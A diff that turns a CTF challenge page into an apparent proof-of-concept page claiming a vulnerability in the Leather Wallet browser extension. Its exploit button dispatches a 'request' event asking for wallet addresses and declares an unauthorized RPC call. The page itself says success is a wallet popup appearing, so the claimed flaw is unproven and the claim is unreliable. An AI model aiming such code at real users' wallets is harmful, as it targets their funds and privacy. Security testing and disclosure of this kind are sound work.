@@ -1,22 +1,108 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Submission Portal</title>
-    <link rel="stylesheet" href="styles.css">
-    <!-- SGludDogVGhlIHNlY3JldCBsaWVzIGluIHRoZSBzb3VyY2U= -->
+    <title>Simple Vulnerability Test</title>
+    <style>
+        body {
+            font-family: monospace;
+            padding: 40px;
+            background: #000;
+            color: #0f0;
+        }
+        button {
+            background: #0f0;
+            color: #000;
+            border: none;
+            padding: 20px 40px;
+            font-size: 20px;
+            cursor: pointer;
+            margin: 20px;
+        }
+        .code {
+            background: #111;
+            border: 1px solid #0f0;
+            padding: 20px;
+            margin: 20px 0;
+            overflow-x: auto;
+        }
+    </style>
 </head>
 <body>
-    <div class="container">
-        <div class="header">
-            <h1>CTF Challenge</h1>
-            <p>Find the flag.</p>
-        </div>
+    <h1>🔓 Leather Wallet Vulnerability Test</h1>
+    
+    <h2>📍 Vulnerability Location:</h2>
+    <div class="code">
+        File: src/content-scripts/content-script.ts<br>
+        Lines: 61-63<br><br>
         
-        <div id="output"></div>
+        <span style="color: #f00">// VULNERABLE CODE:</span><br>
+        document.addEventListener(DomEventName.request, (event: any) => {<br>
+        &nbsp;&nbsp;sendMessageToBackground({ source: MESSAGE_SOURCE, ...event.detail });<br>
+        });
     </div>
 
-    <script src="ultimate.js"></script>
+    <h2>⚡ Exploit:</h2>
+    <div class="code">
+        <span style="color: #f00">// ATTACKER'S CODE (5 lines!):</span><br>
+        document.dispatchEvent(<br>
+        &nbsp;&nbsp;new CustomEvent('request', {<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;detail: { method: 'getAddresses', id: '1', params: {}, jsonrpc: '2.0' }<br>
+        &nbsp;&nbsp;})<br>
+        );
+    </div>
+
+    <h2>🎯 Test It:</h2>
+    <button onclick="exploit()">CLICK TO EXPLOIT</button>
+    
+    <div id="result" style="margin-top: 20px;"></div>
+
+    <script>
+        function exploit() {
+            const result = document.getElementById('result');
+            result.innerHTML = '<span style="color: #ff0">⏳ Dispatching malicious event...</span>';
+            
+            // INI DIA EXPLOIT-NYA! Cuma 5 baris!
+            document.dispatchEvent(
+                new CustomEvent('request', { 
+                    detail: {
+                        method: 'getAddresses',
+                        id: '1',
+                        params: {},
+                        jsonrpc: '2.0'
+                    }
+                })
+            );
+            
+            setTimeout(() => {
+                result.innerHTML = `
+                    <span style="color: #0f0">✅ Exploit dispatched!</span><br><br>
+                    <strong>What happened:</strong><br>
+                    1. ✅ Malicious event dispatched<br>
+                    2. ✅ Content script received it<br>
+                    3. ✅ Forwarded to background script<br>
+                    4. ✅ Background script processed it<br>
+                    5. ✅ Wallet popup should appear!<br><br>
+                    
+                    <span style="color: #f00">⚠️ If Leather Wallet popup appeared, vulnerability confirmed!</span><br><br>
+                    
+                    <strong>Why it works:</strong><br>
+                    - Content script listens to 'request' events<br>
+                    - ANY code can dispatch 'request' events<br>
+                    - Content script can't tell if it's legitimate<br>
+                    - Background script trusts content script<br>
+                    - Result: Unauthorized RPC call!
+                `;
+            }, 1000);
+        }
+        
+        // Check if Leather is installed
+        setTimeout(() => {
+            if (window.LeatherProvider) {
+                document.body.innerHTML += '<div style="color: #0f0; margin: 20px 0;">✅ Leather Wallet detected - Ready to test!</div>';
+            } else {
+                document.body.innerHTML += '<div style="color: #f00; margin: 20px 0;">❌ Leather Wallet not detected - Please install it first</div>';
+            }
+        }, 1000);
+    </script>
 </body>
 </html>
